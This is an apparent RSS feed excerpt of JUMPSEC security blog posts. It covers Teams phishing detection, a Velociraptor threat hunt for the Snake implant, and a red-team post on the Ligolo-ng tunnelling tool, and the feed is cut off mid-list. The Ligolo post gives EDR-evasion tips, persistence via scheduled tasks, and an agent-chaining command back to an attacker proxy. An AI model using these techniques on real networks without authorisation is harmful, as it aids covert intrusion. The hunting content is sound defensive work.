&lt;p&gt;If either of the above will not work in your unique business case you have a few options. Firstly, endeavour to educate staff on the possibility of productivity apps such as Teams, Slack, Sharepoint, etc, for launching social engineering campaigns. It is not just email that is being abused any more, and yet it seems, in my personal opinion, that when using alternative avenues to email there is an inherent trust, due to the rich history connecting phishing and emails. &lt;/p&gt;
&lt;p&gt;Regarding detections, there is currently limited support from Microsoft. Whilst there are plenty of Teams logs (see here for a full list &lt;a href=&#34;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&lt;/a&gt;) these do not currently cover the crucial ‘External Tenants Messaging your Staff’, or even better ‘Staff Member Accepts Message Request from External Tenant’. The latter would be preferable, as it would eliminate alerts from previously-known external tenants (your service providers, etc) and focus just on new message requests. I have reached out to Microsoft to attempt to turn on these logs so that they can be monitored in line with the increased usage of Teams for social engineering. If you agree that this should be made available, then please give the feature request a thumbs up (&lt;a href=&#34;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;Whilst not a perfect solution, it would be possible to use web proxy logs to alert on, or more likely gain some baseline visibility into, staff members accepting external message requests. In EMEA, when a Teams user accepts a message request from an external tenant it sends a POST request to a unique URI which you can monitor:&lt;/p&gt;
&lt;p&gt;/api/mt/emea/beta/userSettings/acceptlist/manage&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19675&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;947&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/request_clean.png&#34; title=&#34;request clean&#34; alt=&#34;request clean&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;request clean&lt;/figcaption&gt;
  &lt;/figure&gt; URI for accepting external message requests[/caption]&lt;/p&gt;
&lt;p&gt;The difficulty, at present, is turning this into a useful piece of telemetry with usernames, and the message in question. Monitoring this will, however, give you an idea of how common this transaction is in your estate, and allow you to potentially implement some of the mitigation factors mentioned above with a more educated understanding. &lt;/p&gt;
&lt;h3&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As a Red Teamer regularly tasked with achieving an initial foothold in a target organisation, I have a unique appreciation and concern for the above-mentioned finding. With over 270 million active monthly users, Teams is incredibly common in target organisations. JUMPSEC’s Detection and Response Team (DART) have seen a trend towards novel phishing and payload delivery techniques leveraged in the wild, including but not limited to using Teams external tenancies for social engineering. With threat actors continually experimenting with new social engineering attacks, organisations are having to expand their security awareness to cover previously-overlooked frontiers.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Hunting the Snake: An Overview of Threat Hunting with Velociraptor</title>
      <link>//localhost:1313/articles/2023/06/2023-06-19-hunting-the-snake-an-overview-of-threat-hunting-with-velociraptor/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/06/2023-06-19-hunting-the-snake-an-overview-of-threat-hunting-with-velociraptor/</guid>
      <description>
        
        
        &lt;p&gt;In May 2023 the NCSC and CISA released a joint cyber security advisory addressing a piece of Russian malware called &lt;a href=&#34;https://www.ncsc.gov.uk/news/uk-and-allies-expose-snake-malware-threat-from-russian-cyber-actors&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Snake&lt;/strong&gt;&lt;/a&gt;. According to them, this malware has been gathering intelligence for the FSB in more than 50 countries for the last 20 years. Off the back of this advisory JUMPSEC decided to perform a number of threat hunts to provide assurance for some of our clients.&lt;/p&gt;
&lt;p&gt;Whilst conducting these hunts, we thought it would be beneficial to share the high-level methodology for this in the form of a blog post, to encourage other security professionals to proactively search for emerging threats in their infrastructure. This post will show that whilst a rich understanding of malware, TTPs, and threat hunting would certainly be beneficial, this is not a hard requirement to get started with your first hunt. Using free open-source tooling such as &lt;a href=&#34;https://github.com/Velocidex/velociraptor&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Velociraptor&lt;/strong&gt;&lt;/a&gt;, anyone can get started.&lt;/p&gt;
&lt;p&gt;Velociraptor enables incident responders, blue teamers and threat hunters to gather data about hosts through a Velociraptor agent deployed on the machine, and run modules (called “artifacts”) to carry out various checks (called “hunts”). The ultimate goal is to determine whether any malicious activity can be observed on the machine, and search for “undetectable” malware that might be running under the hood.&lt;/p&gt;
&lt;p&gt;A more detailed overview of the TTPs and IoCs discovered by the NCSC and CISA’s detailed joint advisory can be found in our recent “&lt;a href=&#34;https://labs.jumpsec.com/hunting-for-snake/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Hunting for Snake&lt;/strong&gt;&lt;/a&gt;&amp;quot;. We urge readers who are interested or concerned about Snake to go and read that.&lt;/p&gt;
&lt;p&gt;Although the hunt came back “clean” (no Snake related implants or IoC were identified in the estate) we thought that readers could still benefit from commands, directions and the thought process that came from our approach when looking for the malicious implant.&lt;/p&gt;
&lt;p&gt;Before starting, our “hunting plan” was designed to consider the following phases when using Velociraptor for hunting:&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Identify executables and known-malicious files (in an attempt to reduce the scope)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;[table id=3 /]&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;Identify anomalous Registry entries on Windows Systems:&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;[table id=4 /]&lt;/p&gt;
&lt;ol start=&#34;9&#34;&gt;
&lt;li&gt;
&lt;p&gt;Identify persistence mechanisms (based on mitre TTPs):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Scheduled Tasks&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Autoruns (autorunsc)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Identify and check unsigned executables against VirusTotal (possibly using a more targeted scope)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Execute &lt;a href=&#34;https://docs.velociraptor.app/exchange/artifacts/pages/windows.eventlogs.hayabusa/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Hayabusa&lt;/strong&gt;&lt;/a&gt; through the Velociraptor agent across the identified possibly-compromised hosts for a forensic analysis of Windows Event Logs.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;For this specific client we performed a hunt using Velociraptor combined with the aforementioned list of IoCs. This is a relatively comprehensive set of hunts for an in-depth analysis needed to determine if the positive IoCs returned at an initial stage are to be considered an incident or not.&lt;/p&gt;
&lt;p&gt;With our game plan laid out, we began the hunt. To start, we looked for executables and known-malicious files using the `Windows.Search.FileFinder` artifact available on Velociraptor, targeting all Windows machines and looking for files such as:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;jpsetup.exe, jpinst.exe, comadmin.dat, werfault.exe&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;And for the following regex string:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;.*\/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog&amp;#34;(regex).&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/ink.png&#34; title=&#34;ink&#34; alt=&#34;Configuring a hunt on Velociraptor&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;ink&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Configuring a hunt on Velociraptor.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If you’ve deployed Velociraptor in your estate you can leverage its features to configure and start hunting for indicators of compromise through the sheer amount of “artifacts” provided to speed up the information gathering phase, as well as labelling and taking actions based on the data returned.&lt;/p&gt;
&lt;p&gt;Velociraptor’s artifacts can be explored on the following two web pages:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Artifacts Reference: &lt;a href=&#34;https://docs.velociraptor.app/artifact_references/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.velociraptor.app/artifact_references/&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Artifacts Exchange - for community developed artifacts: &lt;a href=&#34;https://docs.velociraptor.app/exchange/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.velociraptor.app/exchange/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;During the hunt setup, it is possible to select how resource-intensive the agent should be when searching for IoCs within the individual hosts.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/cpu.png&#34; title=&#34;cpu&#34; alt=&#34;cpu&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;cpu&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Limiting the CPU usage for the agents to 20%.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This is useful when there are sensitive legacy hosts running in the network. However, do note that this only applies to the CPU usage and not the actual bandwidth utilised by Velociraptor’s agents.&lt;/p&gt;
&lt;p&gt;Subsequently, we used the following paths to look for wefault.exe, the persistence mechanism employed by Snake:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;C:\Windows\**\werfault.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;C:\windows\system32\**\werfault.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C:\windows\system32\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\*.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C:\Users\**\werfault.exe&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/hunt1.png&#34; title=&#34;hunt1&#34; alt=&#34;hunt1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;hunt1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Configuring the hunt for werfault.exe&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;While multiple instances for this file were returned, none of them were actually revealing a compromise as they are legitimately signed and presenting a standard icon size.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/werfault.png&#34; title=&#34;werfault&#34; alt=&#34;werfault&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;werfault&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Multiple instances of werfault.exe were returned, but they were not malicious.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This file should also be searched using the following YARA rule to identify versions using an icon size different from the standard (one of the IoCs associated with this threat). This rule should be run on all files in the typical path, but more specifically for the `%Windows%\WinSxS` directory.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/yararule.png&#34; title=&#34;yararule&#34; alt=&#34;yararule&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;yararule&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;YARA rule to search for malicious wefault.exe files.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The YARA rule confirmed that no hosts running &lt;code&gt;werfault.exe&lt;/code&gt; presented a non-standard icon size.&lt;/p&gt;
&lt;p&gt;Another IoC to look for is `comadmin.dat` which contains Snake&amp;rsquo;s Queue File (one of snake&amp;rsquo;s components, listed in our accompanying &lt;a href=&#34;https://labs.jumpsec.com/hunting-for-snake/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;blog&lt;/strong&gt;&lt;/a&gt;). If nothing comes back from this search, further searches can be done utilising a yara rule to search for a `comadmin.dat` with high entropy.&lt;/p&gt;
&lt;p&gt;We hunted for instances of comadmin.dat, using both the `Windows.Search.FileFinder` and the `Generic.Detection.Yara.Glob` artifacts. The YARA rule is required to identify instances of this file presenting high-entropy.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/yarasetup.png&#34; title=&#34;yarasetup&#34; alt=&#34;yarasetup&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;yarasetup&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Configuring YARA rule to hunt for comadmin.dat&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The above-mentioned rule can also be used to look for files presenting a similar filename to the following glob:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;*.*.crmlog&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/crmlog.png&#34; title=&#34;crmlog&#34; alt=&#34;crmlog&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;crmlog&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Hunting for *.*.crmlog using the YARA rule&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The last search we performed was in relation to the registry values known to be present when Snake is running on a host. We looked for default instances of known encryption / decryption keys from Snake in the `SECURITY\Policy\Secrets\n` registry.&lt;/p&gt;
&lt;p&gt;Using the known-malicious values listed in the original advisory we used a custom module to execute this hunt.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/regquery.png&#34; title=&#34;regquery&#34; alt=&#34;regquery&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;regquery&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Configuring the hunt to search for known malicious values in Windows Registry.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;At this point, we were satisfied with the consistency of negative results and since nothing suspicious came back we stopped the hunt there. However, one last check could consist of searching the memory of the hosts using the Yara rule developed by researchers at &lt;a href=&#34;https://gist.github.com/msuiche/8c8fd278430dda0292b4cfdfc549ca2d&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;SigmaHQ&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Velociraptor provides an artifact that allows you to run YARA rules in memory, however do use this at your own discretion and based on your network stability, reliability and bandwidth as the document referencing this artifact actually warns users that the feature is experimental and can end up crashing your system!&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/yara2.png&#34; title=&#34;yara2&#34; alt=&#34;yara2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;yara2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;YARA rule that can be deployed to search in-memory execution&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;In this case I could happily conclude that no indicators of compromise were observed on any of the Windows hosts analysed in our client’s network.&lt;/p&gt;
&lt;p&gt;In conclusion, JUMPSEC recommends readers to hunt for Snake in their estate as soon as possible to rid themselves of all concerns relating to this persistent threat actor. Tools like Velociraptor have made this straightforward and can enable hunting and incident response capabilities relatively painlessly. Steps like the ones presented in this blog post can help readers become first-time hunters - identifying, isolating or entirely eliminating threats from within their estate.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Ligolo: Quality of Life on Red Team Engagements</title>
      <link>//localhost:1313/articles/2023/06/2023-06-09-ligolo-quality-of-life-on-red-team-engagements/</link>
      <pubDate>Fri, 09 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/06/2023-06-09-ligolo-quality-of-life-on-red-team-engagements/</guid>
      <description>
        
        
        &lt;p&gt;**&lt;figure&gt;
    &lt;img src=&#34;images/ligolo-bugsbunny-2023-06-09_12-50-300x267.png&#34; title=&#34;ligolo bugsbunny 2023 06 09 12 50&#34; alt=&#34;ligolo bugsbunny 2023 06 09 12 50&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;ligolo bugsbunny 2023 06 09 12 50&lt;/figcaption&gt;
  &lt;/figure&gt;**In recent months we, JUMPSEC’s red team, have been using a nifty little tool that we would like to share with you in this blog post. Ligolo-ng is a versatile tool that has been aiding our covert, and slightly-less-covert, engagements with regards to tunnelling, exfiltration, persistence, and widely improving the operators’ “quality of life” when carrying out assessments involving beaconing from within an internal network.&lt;/p&gt;
&lt;p&gt;This highly-useful tool is developed by Nicolas Chatelain and can be found on Github at &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/nicocha30/ligolo-ng&lt;/a&gt;. Ligolo can be described as a modern tunnelling tool, similar to the likes of chisel, sshuttle or SSH, with the advantage of being written in GO and behaving just like a VPN. That is to say, when setup correctly operators can enjoy connections to a target network of up to 100 Mbits/sec, utilising various protocols such as ICMP (ping), UDP scans, SYN stealth scan, OS detection and DNS Resolution, which are commonly not allowed through proxychains or “standard” tunnelling tooling.&lt;/p&gt;
&lt;p&gt;The tool uses agents on the compromised machine which connect to a publicly-facing proxy server to route traffic through a tun interface that is created on the host. In simple terms, Ligolo offers red teamers an alternative C2 channel that supports far more than traditional SSH or SOCKS proxies, allowing you to run a wider variety of tooling, much faster, and with what feels like too-good-to-be-true quality of life.&lt;/p&gt;
&lt;p&gt;The gif below shows how quick it is to setup the proxy server on a linux host machine after downloading the proxy executable from the releases’ page on Github.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/latest_ligolo_demo_setup5.gif&#34; title=&#34;latest ligolo demo setup5&#34; alt=&#34;latest ligolo demo setup5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;latest ligolo demo setup5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More and more, when using this tool, we discover features applicable to new use-cases. For example, beside its ease of use, things like using ping and private domain name resolution during a red team engagement are invaluable and can definitely improve the turnaround time and efficiency of an assessment. Once the necessary steps have been taken, as detailed below, operators can enjoy their entire suite of red team tooling on their linux server, with full name resolution, and speeds that are incomparable with that of traditional tunnelling on red team engagements. We have jokingly referred to Ligolo as allowing you to move your C2 into the target network!&lt;/p&gt;
&lt;p&gt;Furthermore, it is possible to set up listeners on deployed agents to welcome connections coming from agents deployed somewhere else in the target environment. Crucially, the agents do not require any privileged permissions to be executed on the compromised hosts, because of its “gvisor” implementation, which works by virtualising sandboxed containers that translate traffic reaching the central proxy server deployed on our host.&lt;/p&gt;
&lt;p&gt;As previously mentioned, GO makes it highly versatile and flexible, allowing operators to customise the proxy as well as the agents, and compile them to bypass defences or implement additional capabilities that are not there by default.&lt;/p&gt;
&lt;p&gt;For example, we found ourselves able to bypass common endpoint detection and response (EDR) mechanisms employed in a Windows environment by simply either packing the agent executable (something like Nimcrypt will do), removing unimportant pieces of code, restructuring the source-code, or by compiling the agents beforehand and adding extra flags to the syntax, such as the following:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GOOS=windows GOARCH=amd64 go build -ldflags=&amp;quot;-s -w&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Researchers at JUMPSEC have also recently determined that, in at least several mature client environments, the creation of new network interfaces is not monitored. Therefore, should you find yourself wanting to deploy a Ligolo proxy server on a compromised machine (remember you don’t need admin permissions to deploy an agent but you do need it to deploy a proxy server!), and that it does not appear that monitoring is in place for tunnelling tools such as Ligolo by default, which makes it an attractive target when compared to existing C2 payloads. A note of caution however, EDRs may flag the “tunnelling” functionality when traffic is exchanged between the agent and the proxy.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/fry-takemymoney-300x300.png&#34; title=&#34;fry takemymoney&#34; alt=&#34;fry takemymoney&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;fry takemymoney&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Once a successful connection has been established packets will be automatically (read automagically) routed to the intended target network, making it a seamless experience, and one that compares with the ease of which you would carry out operations in your own local network.&lt;/p&gt;
&lt;p&gt;The agents can be easily modified and trivially executed by a Scheduled Task or a Cron Job for backdoor purposes or to establish persistence. When trying to achieve domain dominance on an engagement we found we were having to spend far less time in fixing or maintaining our foothold when compared to the usual routines of dealing with beacons, port forwarding and SSH tunnelling. Furthermore, we found that generally there are less restrictions in regards to the traffic we are allowed to generate and forward through.&lt;/p&gt;
&lt;p&gt;As previously mentioned, another interesting capability of this tool is the possibility to create listeners on the agent themselves to chain connections as shown in the code block below.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[Agent : domain\Administrator@VICTIM] &amp;gt;&amp;gt; listener_add --addr &amp;lt;agent_ip&amp;gt;:11601 --to &amp;lt;proxyserver_ip&amp;gt;:11601
INFO[0326] Listener created on remote agent!&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This behaviour is particularly useful when the proxy server’s IP address is out of reach for the last deployed agent, but connection can be established from the final pivoted box to the adjacent network running a previously deployed ligolo’s agent, allowing a pass-through connection back to our proxy server leveraged by the agent listener/forwarder.&lt;/p&gt;
&lt;p&gt;Finally, some caveats to keep in consideration…Ligolo does not automatically recognise the subnets where traffic needs to be redirected to, therefore you will need to add your routes as you discover or need them, using something like “sudo ip route add 192.168.0.0/24 dev ligolo” on the proxy server’s host, and target’s nameservers to /etc/resolv.conf to use DNS instead of IP addresses in an internal network. Furthermore, do not expect your agents to automatically establish a tunnel when reconnecting to the proxy…an auto-connect feature needs to be developed in-house or wait for the feature to be released by the author. Finally, remember that when using it for client networks, you will need a publicly facing box reachable by the agents to listen for connections and execute commands from.&lt;/p&gt;
&lt;p&gt;All in all, Ligolo enabled us to speed up our engagements, made our shells more stable and reliable, allowed for a larger and more comprehensive gathering of our targets data, and helped us spend less time maintaining an important part of our persistent operational infrastructure. Most importantly, it avoids the use of tooling on-disk or even in memory, as only the raw traffic leaves the compromised machine.&lt;/p&gt;
&lt;p&gt;To conclude this blogpost, I just want to say (write) that we love Ligolo and we are very grateful to Nicolas Chatelain for creating this amazing instrument that we are proud to have in our day-to-day operational tool suite.&lt;/p&gt;
&lt;p&gt;References&lt;/p&gt;
&lt;p&gt;● The Cyber Plumber&amp;rsquo;s Handbook - &lt;a href=&#34;https://github.com/opsdisk/the&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/opsdisk/the&lt;/a&gt;_cyber_plumbers_handbook&lt;/p&gt;
&lt;p&gt;● Ligolo-ng - &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/nicocha30/ligolo-ng&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;● Gvisor - &lt;a href=&#34;https://gvisor.dev/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gvisor.dev/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Alternatives to Ligolo-ng:&lt;/p&gt;
&lt;p&gt;● Proxychains - &lt;a href=&#34;https://github.com/haad/proxychains&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/haad/proxychains&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;● Proxychains-ng - &lt;a href=&#34;https://github.com/rofl0r/proxychains-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/rofl0r/proxychains-ng&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;● Chisel - &lt;a href=&#34;https://github.com/jpillora/chisel&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/jpillora/chisel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;● SSHuttle - &lt;a href=&#34;https://github.com/sshuttle/sshuttle&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/sshuttle/sshuttle&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Hunting for &#39;Snake&#39;</title>
      <link>//localhost:1313/articles/2023/05/2023-05-26-hunting-for-snake/</link>
      <pubDate>Fri, 26 May 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/05/2023-05-26-hunting-for-snake/</guid>
      <description>
        
        
        &lt;p&gt;Following the NCSC and CISA’s detailed &lt;a href=&#34;https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;joint advisory&lt;/a&gt; on the highly sophisticated ‘Snake’ cyber espionage tool, JUMPSEC threat intelligence analysts have provided a condensed blueprint for organisations to start proactively hunting for Snake within their network, contextualising key Indicators of Compromise (IoC), and providing additional methods to validate the effectiveness of Snake detections.&lt;/p&gt;
&lt;h1&gt;Snake’s capabilities&lt;/h1&gt;&lt;p&gt;The implant dubbed ‘Snake’ has been attributed to Centre 16 of Russia’s state sponsored FSB. The tool has been collecting intelligence in over 50 countries for up to 20 years, targeting research facilities, government networks, financial services, communications organisations, and other Critical National Infrastructure (CNI) organisations, meaning these organisations should be particularly vigilant and take precautionary steps to protect their networks.&lt;/p&gt;
&lt;p&gt;Described by CISA as Centre 16’s “most sophisticated cyber espionage tool for long-term intelligence collection”, Snake typically targets and infects external facing infrastructure, with its ultimate aim to compromise domain controllers and administrator accounts, enabling attackers to gain widespread access and control within targeted networks.&lt;/p&gt;
&lt;p&gt;Snake achieves these aims though a combination of several advanced technical features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A decentralised model - While the majority of malicious implants listen to and report back to a central node (i.e C2 or Command and Control Server) as part of a centralised infrastructure, Snake leverages a “decentralised” Peer-to-peer (P2P) network, supported by active implants residing on infected systems. As no centralised node acts as C2, commands and their output can be sent, received or retrieved all within the P2P network as nodes communicate with each other to route traffic and store information.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Indistinguishable from legitimate traffic - FSB operators can ensure that all traffic to targeted machines follow the Snake custom HTTP protocol effectively blending with legitimate traffic when using a compromised HTTP server as part of the Snake P2P network.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Numerous containerised tools and techniques – The implant conceals a plethora of tools, including network sniffers and keyloggers that can enable further compromise of target networks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Operating as a Kernel Driver (rootkit capabilities / kernel driver) – The aforementioned concealed techniques and tools can subsequently infect machines in Kernel Land while simultaneously leveraging active and passive operational mechanisms to achieve its aims.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
